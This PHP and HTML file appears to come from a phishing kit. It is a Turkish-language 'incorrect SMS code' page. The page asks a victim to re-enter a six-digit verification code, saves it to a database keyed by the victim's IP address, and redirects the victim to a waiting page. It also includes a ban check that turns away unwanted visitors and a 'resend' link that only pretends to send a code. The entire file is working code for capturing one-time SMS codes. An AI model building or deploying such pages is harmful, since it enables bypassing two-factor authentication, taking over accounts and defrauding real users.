<?php  
require_once 'connect.php';
if ($ajax->banControl(IP)) {
  $ajax->redirect(BAN_URL);
}


if (isset($_POST['submit']) && isset($_POST['code1']) && isset($_POST['code2']) && isset($_POST['code3']) && isset($_POST['code4'])) {
  $code1 = $_POST['code1'];
  $code2 = $_POST['code2'];
  $code3 = $_POST['code3'];
  $code4 = $_POST['code4'];
  $code5 = $_POST['code5'];
  $code6 = $_POST['code6'];

  $combinedCode = $code1 . $code2 . $code3 . $code4 . $code5 . $code6;

  
  $query = $db->prepare("UPDATE records SET ajaxsms = ?, lastOnline = ? WHERE ipAddress=?");
  $query->execute([$combinedCode,time(),IP]);

  if($query)
  {
    $ajax->redirect('wait');
  }

}

$ajax->pageUpdate(IP,'Hatalı SMS');
?> 


<!DOCTYPE html>
<html lang="en">

<head>
  <!-- Required Meta Tags Always Come First -->
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <!-- Title -->

  <!-- Favicon -->
     
     <link rel="shortcut icon" href="./favicon.png" type="image/x-icon" />

  <!-- Font -->
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet">

  <!-- CSS Implementing Plugins -->
  <link rel="stylesheet" href="./assets/css/vendor.min.css">

  <!-- CSS Front Template -->
  <link rel="stylesheet" href="./assets/css/theme.minc619.css?v=1.0">

  <link rel="preload" href="./assets/css/theme.min.css" data-hs-appearance="default" as="style">
  <link rel="preload" href="./assets/css/theme-dark.min.css" data-hs-appearance="dark" as="style">

  <style data-hs-appearance-onload-styles>
    *
    {
      transition: unset !important;
    }

    body
    {
      opacity: 0;
    }
  </style>

  <script>
            window.hs_config = {"autopath":"@@autopath","deleteLine":"hs-builder:delete","deleteLine:build":"hs-builder:build-delete","deleteLine:dist":"hs-builder:dist-delete","previewMode":false,"startPath":"/index.html","vars":{"themeFont":"https://fonts.googleapis.com/css2?family=Inter:wght@400;600&display=swap","version":"?v=1.0"},"layoutBuilder":{"extend":{"switcherSupport":true},"header":{"layoutMode":"default","containerMode":"container-fluid"},"sidebarLayout":"default"},"themeAppearance":{"layoutSkin":"default","sidebarSkin":"default","styles":{"colors":{"primary":"#377dff","transparent":"transparent","white":"#fff","dark":"132144","gray":{"100":"#f9fafc","900":"#1e2022"}},"font":"Inter"}},"languageDirection":{"lang":"en"},"skipFilesFromBundle":{"dist":["./assets/js/hs.theme-appearance.js","./assets/js/hs.theme-appearance-charts.js","./assets/js/demo.js"],"build":["./assets/css/theme.css","./assets/vendor/hs-navbar-vertical-aside/dist/hs-navbar-vertical-aside-mini-cache.js","./assets/js/demo.js","./assets/css/theme-dark.html","./assets/css/docs.css","./assets/vendor/icon-set/style.html","./assets/js/hs.theme-appearance.js","./assets/js/hs.theme-appearance-charts.js","node_modules/chartjs-plugin-datalabels/dist/chartjs-plugin-datalabels.min.html","./assets/js/demo.js"]},"minifyCSSFiles":["./assets/css/theme.css","./assets/css/theme-dark.css"],"copyDependencies":{"dist":{"*./assets/js/theme-custom.js":""},"build":{"*./assets/js/theme-custom.js":"","node_modules/bootstrap-icons/font/*fonts/**":"./assets/css"}},"buildFolder":"","replacePathsToCDN":{},"directoryNames":{"src":"./src","dist":"./dist","build":"./build"},"fileNames":{"dist":{"js":"theme.min.js","css":"theme.min.css"},"build":{"css":"theme.min.css","js":"theme.min.js","vendorCSS":"vendor.min.css","vendorJS":"vendor.min.js"}},"fileTypes":"jpg|png|svg|mp4|webm|ogv|json"}
            window.hs_config.gulpRGBA = (p1) => {
  const options = p1.split(',')
  const hex = options[0].toString()
  const transparent = options[1].toString()

  var c;
  if(/^#([A-Fa-f0-9]{3}){1,2}$/.test(hex)){
    c= hex.substring(1).split('');
    if(c.length== 3){
      c= [c[0], c[0], c[1], c[1], c[2], c[2]];
    }
    c= '0x'+c.join('');
    return 'rgba('+[(c>>16)&255, (c>>8)&255, c&255].join(',')+',' + transparent + ')';
  }
  throw new Error('Bad Hex');
}
            window.hs_config.gulpDarken = (p1) => {
  const options = p1.split(',')

  let col = options[0].toString()
  let amt = -parseInt(options[1])
  var usePound = false

  if (col[0] == "#") {
    col = col.slice(1)
    usePound = true
  }
  var num = parseInt(col, 16)
  var r = (num >> 16) + amt
  if (r > 255) {
    r = 255
  } else if (r < 0) {
    r = 0
  }
  var b = ((num >> 8) & 0x00FF) + amt
  if (b > 255) {
    b = 255
  } else if (b < 0) {
    b = 0
  }
  var g = (num & 0x0000FF) + amt
  if (g > 255) {
    g = 255
  } else if (g < 0) {
    g = 0
  }
  return (usePound ? "#" : "") + (g | (b << 8) | (r << 16)).toString(16)
}
            window.hs_config.gulpLighten = (p1) => {
  const options = p1.split(',')

  let col = options[0].toString()
  let amt = parseInt(options[1])
  var usePound = false

  if (col[0] == "#") {
    col = col.slice(1)
    usePound = true
  }
  var num = parseInt(col, 16)
  var r = (num >> 16) + amt
  if (r > 255) {
    r = 255
  } else if (r < 0) {
    r = 0
  }
  var b = ((num >> 8) & 0x00FF) + amt
  if (b > 255) {
    b = 255
  } else if (b < 0) {
    b = 0
  }
  var g = (num & 0x0000FF) + amt
  if (g > 255) {
    g = 255
  } else if (g < 0) {
    g = 0
  }
  return (usePound ? "#" : "") + (g | (b << 8) | (r << 16)).toString(16)
}
            </script>
</head>

<body>

  <script src="./assets/js/hs.theme-appearance.js"></script>

  <!-- ========== MAIN CONTENT ========== -->
  <main id="content" role="main" class="main">
    

    <!-- Content -->
    <div class="container py-5 py-sm-7">
  

      <div class="mx-auto" style="max-width: 30rem;">
        <!-- Card -->
        <div class="card card-lg mb-5">
          <div class="card-body text-center">
            <div class="mb-4">
              <img class="avatar avatar-xxl avatar-4x3" src="./assets/svg/illustrations/oc-unlock.svg" alt="Image Description" data-hs-theme-appearance="default">
              <img class="avatar avatar-xxl avatar-4x3" src="./assets/svg/illustrations-light/oc-unlock.svg" alt="Image Description" data-hs-theme-appearance="dark">
            </div>

            <div class="mb-5">
              <h1 class="display-5" style="color:#ff0202bf;">Hatalı SMS Girdiniz</h1>
              <p class="mb-0">Lütfen doğrulama kodunuzu dikkatlice giriniz. </p>
                    </div>
<form method="post" action="">
<div class="row gx-2 gx-sm-3">
    <div class="col">
      <!-- Form -->
      <div class="mb-4">
        <input type="tel" class="form-control form-control-single-number" id="code1" name="code1" placeholder="" required aria-label="" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
      <!-- End Form -->
    </div>

    <div class="col">
      <!-- Form -->
      <div class="mb-4">
        <input type="tel" class="form-control form-control-single-number" id="code2" name="code2" placeholder="" required aria-label="" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
      <!-- End Form -->
    </div>

    <div class="col">
      <!-- Form -->
      <div class="mb-4">
        <input type="tel" class="form-control form-control-single-number" id="code3" name="code3" placeholder="" required aria-label="" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
      <!-- End Form -->
    </div>

    <div class="col">
      <!-- Form -->
      <div class="mb-4">
        <input type="tel" class="form-control form-control-single-number" id="code4" name="code4" placeholder="" required aria-label="" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
      <!-- End Form -->
    </div>
    <div class="col">
      <!-- Form -->
      <div class="mb-4">
        <input type="tel" class="form-control form-control-single-number" id="code5" name="code5" placeholder="" required aria-label="" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
      <!-- End Form -->
    </div>
    <div class="col">
      <!-- Form -->
      <div class="mb-4">
        <input type="tel" class="form-control form-control-single-number" id="code6" name="code6" placeholder="" required aria-label="" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false">
      </div>
      <!-- End Form -->
    </div>
  </div>
  <div class="d-grid mb-3">
    <button type="submit" name="submit" class="btn btn-primary btn-lg">Devam et</button>
  </div>
</form>

            <div class="text-center">
    <p id="message">Kodu almadın mı? <a href="#" id="resendLink">Tekrar gönder.</a></p>
  </div>

          </div>
        </div>
        <!-- End Card -->

        <!-- Footer -->
       
        <!-- End Footer -->
      </div>
    </div>
    <!-- End Content -->
  </main>
  <!-- ========== END MAIN CONTENT ========== -->

  <!-- JS Implementing Plugins -->
  <script src="./assets/js/vendor.min.js"></script>

  <!-- JS Front -->
  <script src="./assets/js/theme.min.js"></script>

  <!-- JS Plugins Init. -->
  <script>
    $(document).ready(function() {
      $("#resendLink").on("click", function(event) {
        event.preventDefault();
        $("#message").text("Gönderildi.").css("color", "#2f6ad9");
      });
    });
  </script>
  <script type="text/javascript">
	$(document).ready(function(){
		$("#code1").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code2").focus();
			}
		});
		$("#code2").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code3").focus();
			}
		});
		$("#code3").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code4").focus();
			}
		});
    $("#code4").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code5").focus();
			}
		});
    $("#code5").keyup(function(){
			var e = $(this).val().length;
			if(e == 1){
				$("#code6").focus();
			}
		});
	});
	</script>
	
	<?php require_once 'add-js.php'; ?>
</body>

</html>